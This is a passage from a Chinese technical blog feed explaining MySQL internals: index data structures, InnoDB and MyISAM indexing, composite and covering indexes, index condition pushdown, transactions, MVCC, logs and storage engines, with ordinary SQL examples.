title="索引的数据结构"></a><strong>索引的数据结构</strong></h2><h3 id="使用索引的基本需求"><a href="#使用索引的基本需求" class="headerlink" title="使用索引的基本需求"></a><strong>使用索引的基本需求</strong></h3><p>等值查询：根据某个值查找数据</p><p>范围查询：根据某个范围区间查找数据</p><p> 排序Order By</p><p>分组Group By</p><h3 id="可选的数据结构"><a href="#可选的数据结构" class="headerlink" title="可选的数据结构"></a><strong>可选的数据结构</strong></h3><p>Hash表，二叉树，平衡二叉查找树（红黑树是一个近似平衡二叉树），B树，B+树</p><p><strong><code>Hash表</code></strong></p><p>Hash表存储表数据Key可以存储索引列，Value可以存储行记录或者行磁盘地址。Hash表在等值查询时效率很高，时间复杂度为O(1)</p><p> <strong><code>二叉查找树</code></strong></p><p>每个节点最多有2个分叉，左子树和右子树数据顺序左小右大</p><p>检索复杂度和<strong>树高</strong>相关：<strong>理想状态</strong>下效率可以达到O(logn)</p><p><strong><code>红黑树</code></strong></p><p>平衡二叉树是采用二分法思维，平衡二叉查找树除了具备二叉树的特点，最主要的特征是树的左右两个子树的层级<strong>最多相差</strong>1<strong>。在插入删除数据时通过</strong>左旋**&#x2F;**右旋操作保持二叉树的平衡，不会出现左子树很高、右子树很矮的情况</p><p>缺点：</p><p>数据量大时候，时间更长</p><p>不支持范围查找</p><p>数据量大的时候，索引磁盘占用较大</p><p><strong><code>B树</code><strong>（</strong>改进二叉树，为多叉树</strong>）</p><p>减少IO次数，减少树的高度。在<strong>每个节点尽可能多的存储</strong>数据<strong>。每个节点可以存储1000个索引（16k&#x2F;16&#x3D;1000），这样就将二叉树改造成了</strong>多叉树，通过增加树的叉树，将树从高瘦变为矮胖</p><p>特点：</p><ul><li>B树的节点中存储着多个元素，每个节点内有多个分叉</li><li>节点中的元素包含键值和数据，节点中的键值从大到小排列。也就是说，在所有的节点都储存数据</li><li><strong>父节点当中的元素不会出现在子节点中</strong></li><li><strong>所有的叶子结点都位于同一层，叶节点具有相同的深度，叶节点之间没有指针连接</strong></li></ul><p><strong><code>B+树</code><strong>（</strong>改进B树，非叶子节点不存储数据</strong>）</p><blockquote><p>B+树和B树最主要的区别在于<strong>非叶子节点是否存储数据</strong>的问题</p></blockquote><p>B+树只有<strong>叶子节点才会存储数据</strong>，<strong>非叶子节点只存储键值</strong>。叶子节点之间使用双向指针连接，最底层的叶子节点形成了一个双向有序链表</p><p>特点：</p><ul><li><p>继承了B树的优点【多叉树的优点】</p></li><li><p>保证等值和范围查询的快速查找</p></li><li><p>MySQL的索引就采用了B+树的数据结构。</p></li></ul><h2 id="存储引擎索引实现"><a href="#存储引擎索引实现" class="headerlink" title="存储引擎索引实现"></a>存储引擎索引实现</h2><h3 id="MyISAM索引"><a href="#MyISAM索引" class="headerlink" title="MyISAM索引"></a><strong><code>MyISAM索引</code></strong></h3><blockquote><p>MyISAM数据文件和索引文件分开存储，索引B+Tree数据结构，其中叶子节点<strong>Key为索引列值</strong>，<strong>数据为所在行的磁盘地址</strong>，表索引存储在索引文件tablename.<code>MYI</code>中，数据文件存储在数据文tablename.<code>MYD</code>中</p></blockquote><h4 id="主键索引："><a href="#主键索引：" class="headerlink" title="主键索引："></a><strong>主键索引</strong>：</h4><p> MyISAM查询时会将索引节点缓存在MySQL缓存中，而数据的缓存依赖于操作OS Cache</p><h4 id="辅助索引："><a href="#辅助索引：" class="headerlink" title="辅助索引："></a><strong>辅助索引</strong>：</h4><ul><li>主键索引必须唯一，辅助索引可以重复</li><li>由于辅助索引重复了，所以即便是等值查询，也需要按照范围查询的方式在辅助索引树上查询数据</li></ul><h3 id="InnoDB索引"><a href="#InnoDB索引" class="headerlink" title="InnoDB索引"></a><strong><code>InnoDB索引</code></strong></h3><p>每个InnoDB表都有一个<strong>聚簇索引</strong> ，也叫聚集索引。除了聚簇索引外的其他索引都叫辅助索引，聚簇索引是B+Tree数据结构，叶子节点存储数据行，非叶子节点存储主键值</p><p>一般情况下主键索引就是<code>聚簇索引</code>，但也存在没有主键的情况，没有主键会采用<code>ROWID</code>构建聚簇索引</p><p>InnoDB的表数据和索引默认存储在一个文件<code>tablename.ibd</code>中</p><h4 id="主键索引：-1"><a href="#主键索引：-1" class="headerlink" title="主键索引："></a><strong>主键索引</strong>：</h4><ul><li>InnoDB要求表<strong>必须有主键索引</strong></li><li>主键索引<strong>叶子节点存储数据行</strong>，<strong>辅助索引只会存储主键值</strong></li><li>底层叶子节点按照顺序排序</li></ul><h4 id="辅助索引：-1"><a href="#辅助索引：-1" class="headerlink" title="辅助索引："></a><strong>辅助索引：</strong></h4><ul><li>InnoDB的辅助索引只会存储主键值而非磁盘地址（重点：MyISAM存储的就是磁盘地址）</li><li>除聚簇索引之外的所有索引都称为辅助索引</li><li>辅助索引查询记录必然经过主键索引：首先查辅助索引获取主键，根据主键在主键索引查询获得记录（回表操作）</li><li>叶子节点按顺序排序</li></ul><h4 id="组合索引："><a href="#组合索引：" class="headerlink" title="组合索引："></a><strong>组合索引</strong>：</h4><p>​表t_multiple_index，id为主键列，创建了一个联合索引idx_abc(a,b,c)，构建的B+树索引结构如图所示。索引树中节点中的索引项按照（a，b，c）的顺序从大到小排列，先按照a列排序，a列相同时按照b列排序，b列相同按照c列排序。在最底层的叶子节点中，如果两个索引项的a，b，c三列都相同，索引项按照主键id排序</p><p><strong>最左前缀匹配原则</strong></p><p><strong>组合索引的最左前缀匹配原则：使用组合索引查询时，mysql会一直向右匹配直至遇到范围查询(<code>&gt;</code>、<code>&lt;</code>、<code>between</code>、<code>like</code>)就停止匹配</strong></p><ul><li>在组合索引树中，最底层的叶子节点按照第一列a列从左到右递增排列，但是b列和c列是无序的，b列只有在a列值相等的情况下小范围内递增有序，而c列只能在a，b两列相等的情况下小范围内递增有序</li></ul><p>能使用索引的情况</p><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> t_multiple_index <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">13</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> t_multiple_index <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">13</span> <span class="token operator">and</span> b<span class="token operator">=</span><span class="token number">16</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> t_multiple_index <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">13</span> <span class="token operator">and</span> b<span class="token operator">=</span><span class="token number">16</span> <span class="token operator">and</span> c<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> t_multiple_index <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">13</span> <span class="token operator">and</span> b<span class="token operator">></span><span class="token number">13</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> t_multiple_index <span class="token keyword">where</span> a<span class="token operator">></span><span class="token number">11</span> <span class="token operator">and</span> b<span class="token operator">=</span><span class="token number">14</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> t_multiple_index <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">16</span> <span class="token operator">and</span> c<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>没有用到索引的情况</p><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> t_multiple_index <span class="token keyword">where</span> b<span class="token operator">=</span><span class="token number">16</span> <span class="token operator">and</span> c<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> t_multiple_index <span class="token keyword">where</span> c<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>总结：创建的**idx_abc(a,b,c)**索引，相当于创建了<code>(a)</code>、<code>（a,b）</code>、<code>（a,b,c）</code>三个索引</p><p>注意事项：</p><p>书写SQL条件的顺序，不一定是执行时候的where条件顺序。优化器会帮助我们优化成索引可以识别的形式</p><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> t_multiple_index <span class="token keyword">where</span> b<span class="token operator">=</span><span class="token number">16</span> <span class="token operator">and</span> c<span class="token operator">=</span><span class="token number">4</span> <span class="token operator">and</span> a<span class="token operator">=</span><span class="token number">13</span><span class="token punctuation">;</span><span class="token comment">#等价于下面的sql，优化器会按照索引的顺序优化</span><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> t_multiple_index <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">13</span> <span class="token operator">and</span> b<span class="token operator">=</span><span class="token number">16</span> <span class="token operator">and</span> c<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><h4 id="覆盖索引："><a href="#覆盖索引：" class="headerlink" title="覆盖索引："></a>覆盖索引：</h4><blockquote><p>select中列数据如果可以直接在辅助索引树上全部获取，也就是说索引树已经“覆盖”了我们的查询需求，这时MySQL就不会白费力气的回表查询，这中现象就是<strong>覆盖索引</strong></p></blockquote><p>使用<code>explain</code>工具查看执行计划，可以看到extra中“<code>Using index</code>”，代表使用了覆盖索引</p><h3 id="索引条件下推ICP"><a href="#索引条件下推ICP" class="headerlink" title="索引条件下推ICP"></a>索引条件下推ICP</h3><p>是MySQL5.6对使用索引从表中检索行的一种优化。ICP可以减少存储引擎必须访问基表的次数以及MySQL服务器必须访问存储引擎的次数。可用于 InnoDB 和 MyISAM 表，对于InnoDB表ICP仅用于辅助索引</p><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#optimizer_switch优化相关参数开关</span>mysql<span class="token operator">></span> <span class="token keyword">show</span> VARIABLES <span class="token operator">like</span> <span class="token string">'optimizer_switch'</span><span class="token punctuation">;</span><span class="token comment">#关闭ICP</span><span class="token keyword">SET</span> optimizer_switch <span class="token operator">=</span> <span class="token string">'index_condition_pushdown=off'</span><span class="token punctuation">;</span><span class="token comment">#开启ICP</span><span class="token keyword">SET</span> optimizer_switch <span class="token operator">=</span> <span class="token string">'index_condition_pushdown=on'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><ul><li>不使用ICP，不满足最左前缀的索引条件的比较是在Server层进行的，非索引条件的比较是在Server层进行的</li><li>使用ICP，所有的索引条件的比较是在存储引擎层进行的，非索引条件的比较是在Server层进行的</li></ul><p>减少回表次数及减少IO次数</p><h4 id="举例说明"><a href="#举例说明" class="headerlink" title="举例说明"></a>举例说明</h4><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token operator">*</span> <span class="token keyword">from</span> t_multiple_index <span class="token keyword">where</span> a<span class="token operator">=</span><span class="token number">13</span> <span class="token operator">and</span> b<span class="token operator">></span><span class="token number">15</span> <span class="token operator">and</span> c<span class="token operator">=</span><span class="token string">'5'</span> <span class="token operator">and</span> d<span class="token operator">=</span><span class="token string">'pdf'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>abc组合索引</p><p>这里b&gt;15阻断组合索引使用</p><p><strong>没使用索引下推情况</strong></p><p>从索引找出满足a&#x3D;13,b&gt;15的数据,然后再通过id 回表找出这部分数据，再到MySQL的server层进行数据过滤</p><p><strong>使用索引下推情况</strong></p><p>从索引找出满足a&#x3D;13,b&gt;15的数据，发现c其实也在组合索引中，这个时候会找出c&#x3D;’5’的数据主键Id，进行回表，再到MySQL的server层进行数据过滤</p><h2 id="创建索引的原则"><a href="#创建索引的原则" class="headerlink" title="创建索引的原则"></a>创建索引的原则</h2><ul><li><p>频繁出现在where 条件字段，order排序，group by分组字段</p></li><li><p>select 频繁查询的列，考虑是否需要创建联合索引（覆盖索引，不回表）</p></li><li><p>多表join关联查询，on字段两边的字段都要创建索引</p></li></ul><h3 id="索引优化建议"><a href="#索引优化建议" class="headerlink" title="索引优化建议"></a><strong>索引优化建议</strong></h3><ol><li><strong>表记录很少不需创建索引</strong></li><li><strong>一个表的索引个数不能过多</strong></li><li><strong>频繁更新的字段不建议作为索引</strong></li><li><strong>区分度低的字段，不建议建索引</strong></li><li><strong>在InnoDB存储引擎中，主键索引建议使用自增的长整型，避免使用很长的字段</strong></li><li><strong>不建议用无序的值作为索引</strong></li><li><strong>尽量创建组合索引，而不是单列索引</strong></li></ol>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>MySQL进阶(二)-事务篇</title>
    <link href="/posts/dce87f52.html"/>
    <url>/posts/dce87f52.html</url>
    
    <content type="html"><![CDATA[<p> MySQL事务回顾，事务底层实现原理，MVCC是如何工作的，Undo日志</p><span id="more"></span><h2 id="事务概念"><a href="#事务概念" class="headerlink" title="事务概念"></a>事务概念</h2><p>事务指的是逻辑上的一组操作，这组操作的组成单元<strong>要么全都成功，要么全都失败</strong>，本质上是个<strong>并发编程问题</strong></p><h3 id="事务四大特性ACID"><a href="#事务四大特性ACID" class="headerlink" title="事务四大特性ACID"></a><strong>事务四大特性ACID</strong></h3><ul><li><p>原子性**<code>A</code>**tomicity</p></li><li><p>一致性**<code>C</code>**onsistency</p></li><li><p>隔离性**<code>I</code>**solation</p></li><li><p>持久性**<code>D</code>**urability</p></li></ul><h3 id="事务并发问题"><a href="#事务并发问题" class="headerlink" title="事务并发问题"></a>事务并发问题</h3><ul><li><code>脏读</code>：一个事务读到了另一个事务**<code>未提交</code>**的数据</li><li><code>不可重复读</code>：一个事务读到另一个事务**<code>已经Update</code>**的数据。引发事务中的多次查询结果不一致</li><li><code>幻读</code>：一个事务读到另一个事务**<code>已经Insert</code>**的数据。导致事务中多次查询的结果不一致</li></ul><h3 id="事务隔离级别"><a href="#事务隔离级别" class="headerlink" title="事务隔离级别"></a><strong>事务隔离级别</strong></h3><p><strong>读未提交RU</strong>：Read Uncommitted，一个事务读到另一个事务没有提交的数据</p><ul><li>存在：3个问题：脏读、不可重复读、幻读</li></ul><p><strong>读已提交RC：</strong>Read Committed，一个事务读到另一个事务已经提交的数据</p><ul><li>存在：2个问题：不可重复读、幻读</li></ul><p><strong>可重复读RR：</strong>Repeatable Read，在一个事务中读到的数据始终保持一致，无论另一个事务是否提交</p><ul><li>存在：1个问题：幻读</li></ul><p><strong>串行化读：</strong>Serializable，同时只能执行一个事务，相当于事务中的单线程</p><h2 id="事务底层原理MVCC"><a href="#事务底层原理MVCC" class="headerlink" title="事务底层原理MVCC"></a>事务底层原理MVCC</h2><blockquote><p>MVCC全称叫多版本并发控制，是RDBMS常用的一种并发控制方法，用来对数据库数据进行并发访问，实现事务</p></blockquote><p><strong><code>读不加锁，读写不冲突</code></strong></p><h3 id="实现原理"><a href="#实现原理" class="headerlink" title="实现原理"></a>实现原理</h3><p><strong>数据快照</strong>，不同十五访问数据快照中不同版本的数据</p><p>InnoDB下的表有<strong>默认字段</strong>和<strong>可见字段</strong>，默认字段是实现MVCC的关键，默认字段是隐藏的列。默认字段最关键的两个列，<strong>一个保存了行的事务<strong><strong>ID</strong></strong>，一个保存了行的回滚指针</strong>。每开始新的事务，都会自动递增产生一个新的事务id。事务开始后，生成当前事务影响行的ReadView。当查询时，需要用当前查询的事务id与ReadView确定要查询的数据版本。</p><h3 id="Undo日志"><a href="#Undo日志" class="headerlink" title="Undo日志"></a>Undo日志</h3><ul><li><p>在对数据修改时，InnoDB会产生一定量的Undo日志，如果事务执行失败Rollback了，则利用Undo日志回滚到历史版本</p></li><li><p>Undo日志还可以解决<strong>丢失更新问题</strong></p></li><li><p>存储位置：系统表空间内的回滚段中</p></li></ul><h4 id="Undo日志分类"><a href="#Undo日志分类" class="headerlink" title="Undo日志分类"></a><strong>Undo日志分类</strong></h4><p>Insert Undo日志：是在Insert操作中产生的Undo日志</p><p>Update Undo日志：是Update或Delete 操作中产生的Undo日志</p><h3 id="ReadView"><a href="#ReadView" class="headerlink" title="ReadView"></a><strong>ReadView</strong></h3><p>ReadView是张存储事务id的表，主要包含当前系统中有哪些活跃的读写事务，把它们的事务id放到一个列表中。结合Undo日志的默认字段【事务trx_id】来控制那个版本的Undo日志可被其他事务看见。</p><p><strong>m_ids</strong>：表示在生成ReadView时，当前系统中<strong>活跃的读写事务</strong>id列表</p><p><strong>m_low_limit_id</strong>：事务id下限，表示当前系统中活跃的读写事务中最小的事务id，m_ids事务列表中的最小事务id</p><p><strong>m_up_limit_id</strong>：事务id上限，表示生成ReadView时，系统中应该分配给下一个事务的id值</p><p><strong>m_creator_trx_id</strong>：表示生成该ReadView的事务的事务id</p><h2 id="事务底层原理（快照读与当前读）"><a href="#事务底层原理（快照读与当前读）" class="headerlink" title="事务底层原理（快照读与当前读）"></a>事务底层原理（快照读与当前读）</h2><p><strong>快照读：</strong>读取的是记录的可见版本 (有可能是历史版本)，不用加锁。</p><p><strong>当前读：</strong>读取的是记录的最新版本，并且当前读返回的记录，都会加上锁，保证其他事务不会再并发修改这条记录</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>MySQL进阶(一)-架构篇</title>
    <link href="/posts/a7d81bc0.html"/>
    <url>/posts/a7d81bc0.html</url>
    
    <content type="html"><![CDATA[<p> 概述整个MySQL的整体架构，日志文件，存储引擎InnoDB，执行流程</p><span id="more"></span><h3 id="MySQL逻辑架构图"><a href="#MySQL逻辑架构图" class="headerlink" title="MySQL逻辑架构图"></a>MySQL逻辑架构图</h3><p><img src="E:\git_repo\hyq965672903.github.io\source_posts\MySQL进阶-一-架构篇.assets\MySQL逻辑架构图.png" alt="MySQL逻辑架构图"></p><h3 id="MySQL日志文件"><a href="#MySQL日志文件" class="headerlink" title="MySQL日志文件"></a>MySQL日志文件</h3><p>MySQL是通过文件系统对数据索引后进行存储的，MySQL从物理结构上可以分为<strong>日志文件</strong>和<strong>数据及索引</strong></p><p><strong>文件</strong>。MySQL在Linux中的数据索引文件和日志文件通常放在&#x2F;var&#x2F;lib&#x2F;mysql目录下。MySQL通过日志记</p><p>录了数据库操作信息和错误信息。</p><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'log_%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><h4 id="常用日志文件"><a href="#常用日志文件" class="headerlink" title="常用日志文件"></a>常用日志文件</h4><ul><li><p>错误日志：&#x2F;var&#x2F;log&#x2F;mysql-error.log</p></li><li><p>二进制日志：&#x2F;var&#x2F;lib&#x2F;mysql&#x2F;mysql-bin</p></li><li><p>查询日志：general_query.log</p></li><li><p>慢查询日志：slow_query_log.log</p></li><li><p>事务重做日志：redo log</p></li><li><p>中继日志：relay log</p></li></ul><h4 id="错误日志"><a href="#错误日志" class="headerlink" title="错误日志"></a>错误日志</h4><blockquote><p>默认开启，错误日志记录了运行过程中遇到的所有严重的错误信息，以及 MySQL每次启动和关闭的详细信息。错误日志所记录的信息是可以通过log_error和log_warnings配置来定义的。从5.5.7以后不能关闭错误日志</p></blockquote><p>log_error：指定错误日志存储位置</p><p>log-warnings：是否将警告信息输出到错误日志中。</p><ul><li><p>log_warnings 为0， 表示不记录告警信息。</p></li><li><p>log_warnings 为1， 表示告警信息写入错误日志。</p></li><li><p>log_warnings 大于1， 表示各类告警信息，例如：有关网络故障的信息和重新连接信息写入</p></li></ul><p>错误日志。</p><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">log_error<span class="token operator">=</span><span class="token operator">/</span>var<span class="token operator">/</span>log<span class="token operator">/</span>mysql<span class="token operator">-</span>error<span class="token punctuation">.</span>loglog_warnings<span class="token operator">=</span><span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><h4 id="二进制日志"><a href="#二进制日志" class="headerlink" title="二进制日志"></a>二进制日志</h4><blockquote><p>默认关闭，需要通过配置进行开启。binlog记录了数据库所有的ddl语句和dml语句，但不包括select语句内容，语句以事件的形式保存，描述了数据的变更顺序，binlog还包括了每个更新语句的执行时间信息。如果是DDL语句，则直接记录到binlog日志，而DML语句，必须通过事务提交才能记录到binlog日志中</p></blockquote><p>binlog主要用于实现mysql<strong>主从复制、数据备份、数据恢复</strong></p><p>不同版本开启方式有些许<code>差异</code></p><h4 id="通用查询日志"><a href="#通用查询日志" class="headerlink" title="通用查询日志"></a>通用查询日志</h4><blockquote><p><strong>默认关闭，</strong>由于通用查询日志会记录用户的所有操作，其中还包含增删查改等信息，在并发操作大的环境下会产生大量的信息从而导致不必要的磁盘IO，会影响MySQL的性能的。</p></blockquote><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">global</span> variables <span class="token operator">like</span> <span class="token string">'%general_log%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>一般不建议开启，调试时候使用</p><h4 id="慢查询日志"><a href="#慢查询日志" class="headerlink" title="慢查询日志"></a>慢查询日志</h4><blockquote><p><strong>默认关闭</strong>，通过以下设置开启。记录执行时间超过<strong>long_query_time</strong>秒的所有查询，便于收集查询时间比较长的SQL语句。</p></blockquote><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> <span class="token keyword">global</span> <span class="token keyword">status</span> <span class="token operator">like</span> <span class="token string">'%Slow_queries%'</span><span class="token punctuation">;</span><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'%slow_query%'</span><span class="token punctuation">;</span><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'long_query_time%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>配置慢查询开启</p><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment"># 开启慢查询日志</span>slow_query_log<span class="token operator">=</span><span class="token keyword">ON</span><span class="token comment"># 慢查询的阈值，单位秒</span>long_query_time<span class="token operator">=</span><span class="token number">10</span><span class="token comment"># 日志记录文件</span><span class="token comment"># 如果没有给出file_name值， 默认为主机名，后缀为-slow.log。</span><span class="token comment"># 如果给出了文件名，但不是绝对路径名，文件则写入数据目录。</span>slow_query_log_file<span class="token operator">=</span>slow_query_log<span class="token punctuation">.</span>log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h3 id="MySQL数据文件"><a href="#MySQL数据文件" class="headerlink" title="MySQL数据文件"></a>MySQL数据文件</h3><p>查看MySQL数据文件</p><figure><div class="code-wrapper"><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">show</span> variables <span class="token operator">like</span> <span class="token string">'%datadir%'</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><ul><li><code>ibdata</code>文件：使用系统表空间存储表数据和索引信息，所有表共同使用一个或者多个ibdata文件</li><li><code>InnoDB</code>存储引擎的数据文件<ul><li>.<strong>frm</strong>文件：主要存放与表相关的数据信息，主要包括表结构的定义信息</li><li>.<strong>ibd</strong>：<strong>使用独享表空间存储表</strong>数据和索引信息，一张表对应一个ibd文件。</li></ul></li><li><code>MyISAM</code>存储引擎的数据文件<ul><li><strong>.frm</strong>文件：主要存放与表相关的数据信息，主要包括表结构的定义信息</li><li><strong>.myd</strong>文件：主要用来存储表数据信息。</li><li><strong>.myi</strong>文件：主要用来存储表数据文件中任何索引的数据树。</li></ul></li></ul><h3 id="MySQL存储引擎之InnoDB"><a href="#MySQL存储引擎之InnoDB" class="headerlink" title="MySQL存储引擎之InnoDB"></a>MySQL存储引擎之InnoDB</h3><blockquote><p>除了特殊场景，一般都选择InnoDB，支持事务，分布式事务</p></blockquote><h4 id="存储引擎种类"><a href="#存储引擎种类" class="headerlink" title="存储引擎种类"></a>存储引擎种类</h4><table><thead><tr><th><strong>存储引擎</strong></th><th>说明</th></tr></thead><tbody><tr><td><code>MyISAM</code></td><td>高速引擎，拥有较高的插入，查询速度，<strong>但不支持事务</strong></td></tr><tr><td><code>InnoDB</code></td><td><strong>5.5<strong><strong>版本后</strong></strong>MySQL****的默认数据库存储引擎，支持事务和行级锁</strong>，比MyISAM处理速度稍慢</td></tr><tr><td>ISAM</td><td>MyISAM的前身，MySQL5.0以后不再默认安装</td></tr><tr><td>MRG_MyISAM</td><td>将多个表联合成一个表使用，在超大规模数据存储时很有用</td></tr><tr><td><code>Memory</code></td><td><strong>内存存储引擎，拥有极高的插入，更新和查询效率。</strong>但是会占用和数据量成正比的内存空间。只在内存上保存数据，意味着数据可能会丢失</td></tr><tr><td>Archive</td><td>将数据压缩后进行存储，非常适合存储大量的独立的，作为历史记录的数据，</td></tr><tr><td>CSV</td><td>CSV 存储引擎是基于 CSV 格式文件存储数据(应用于跨平台的数据交换)</td></tr></tbody></table><h4 id="InnoDB和MyISAM存储引擎区别"><a href="#InnoDB和MyISAM存储引擎区别" class="headerlink" title="InnoDB和MyISAM存储引擎区别"></a><code>InnoDB</code>和<code>MyISAM</code>存储引擎区别</h4><table><thead><tr><th><strong>比较项</strong></th><th>InnoDB</th><th>MyISAM</th></tr></thead><tbody><tr><td><strong>存储文件</strong></td><td>.frm 表定义文件.ibd 数据文件和索引文件</td><td>frm 表定义文件.myd 数据文件.myi 索引文件</td></tr><tr><td><strong>锁</strong></td><td>表锁、行锁</td><td>表锁</td></tr><tr><td><strong>事务</strong></td><td>支持</td><td>不支持</td></tr><tr><td><strong>CRUD</strong></td><td>读、写</td><td>读多</td></tr><tr><td><strong>索引结构</strong></td><td>B+ Tree</td><td>B+ Tree</td></tr></tbody></table><h4 id="InnoDB架构图"><a href="#InnoDB架构图" class="headerlink" title="InnoDB架构图"></a>InnoDB架构图</h4><p><img src="http://file.hyqup.cn/img/InnoDB%E6%9E%B6%E6%9E%84%E5%9B%BE.png" alt="InnoDB架构图"></p><h5 id="内存结构"><a href="#内存结构" class="headerlink" title="内存结构"></a>内存结构</h5><ol><li><p>Buffer Pool 缓冲池</p></li><li><p>Change Buffer 修改缓冲</p></li><li><p>Adaptive Hash Index 自适应索引</p></li><li><p>Log Buffer 日志缓冲</p></li></ol><h6 id="Buffer-Pool-缓冲池"><a href="#Buffer-Pool-缓冲池" class="headerlink" title="Buffer Pool 缓冲池"></a>Buffer Pool 缓冲池</h6><blockquote><p>缓冲池Buffer Pool 用于加速数据的访问和修改，通过将热点数据缓存在内存的方法，最大限度地减少磁盘 IO，加速热点数据读写</p></blockquote><h6 id="Change-Buffer-修改缓冲"><a href="#Change-Buffer-修改缓冲" class="headerlink" title="Change Buffer 修改缓冲"></a>Change Buffer 修改缓冲</h6><blockquote><p>Change Buffer（在 MySQL 5.6 之前叫 insert buffer，简称 ibuf ）是 InnoDB 5.5 引入的一种优化策略。<strong>Change Buffer</strong> <strong>用于加速非热点数据中二级索引的写入操作。</strong>由于二级索引数据的不连续性，导致修改二级索引时需要进行频繁的磁盘 IO 消耗大量性能，Change Buffer 缓冲对二级索引的修改操作，同时将写操作录入 redo log 中，在缓冲到一定量或系统较空闲时进行 merge 操作将修改写入磁盘中。</p></blockquote><h6 id="Adaptive-Hash-Index-自适应索引"><a href="#Adaptive-Hash-Index-自适应索引" class="headerlink" title="Adaptive Hash Index 自适应索引"></a>Adaptive Hash Index 自适应索引</h6><blockquote><p><strong>自适应哈希索引</strong>（Adaptive Hash Index，<strong>AHI</strong>）<strong>用于实现对于热数据页的一次查询。</strong>是建立在索引之上的索引！使用聚簇索引进行<strong>数据页</strong>定位的时候需要根据索引树的高度从根节点走到叶子节点，**通常需要3 到 4 <strong>次查询才能定位到数据</strong>。InnoDB 根据对索引使用情况的分析和索引字段的分析，通过自调优Self-tuning的方式为索引页建立或者删除哈希索引。</p></blockquote><h6 id="Log-Buffer-日志缓冲"><a href="#Log-Buffer-日志缓冲" class="headerlink" title="Log Buffer 日志缓冲"></a>Log Buffer 日志缓冲</h6><blockquote><p><strong>InnoDB</strong> <strong>使用</strong> <strong>Log Buffer</strong> <strong>来缓冲日志文件的写入操作。</strong>内存写入加上日志文件顺序写的特点，使得InnoDB 日志写入性能极高。</p></blockquote><h5 id="磁盘结构"><a href="#磁盘结构" class="headerlink" title="磁盘结构"></a>磁盘结构</h5><p><strong>表空间</strong></p><p>在磁盘中，InnoDB 将所有数据都逻辑地存放在一个空间中，称为表空间（Tablespace）。表空间由段（Segment）、区（extent）、页（Page）组成</p><ul><li><p>开启独立表空间<code>innodb_file_per_table=1</code>每张表的数据都会存储到一个独立表空间，即 表名.ibd 文件</p></li><li><p>关闭独占表空间<code>innodb_file_per_table=0</code>，则所有基于InnoDB存储引擎的表数据都会记录到系统表空间，即 ibdata1 文件</p></li></ul><p>表空间是 InnoDB 物理存储中的最高层，目前的表空间类别包括：</p><ul><li><p>系统表空间（System 